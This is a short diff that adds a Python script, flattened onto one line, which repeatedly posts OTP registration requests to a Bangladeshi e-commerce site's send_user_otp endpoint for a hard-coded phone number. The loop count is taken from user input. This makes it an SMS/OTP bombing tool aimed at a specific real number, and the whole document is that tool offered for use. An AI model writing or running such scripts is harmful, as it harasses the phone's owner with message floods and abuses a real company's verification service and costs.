@@ -1,0 +1,2 @@
+# probashii
+import requests from requests.structures import CaseInsensitiveDict Amo=int(input("Enter Amount: ")) url = "https://shopup.com.bd/users/send_user_otp.json"  headers = CaseInsensitiveDict() headers["Content-Type"] = "application/json"  data = """ {   "user": {     "login": "8801833268701",     "resend": false,     "type": {       "register": true     }   },   "direct_login": true } """  for i in range(Amo):     resp = requests.post(url, headers=headers, data=data)     print(resp.text)
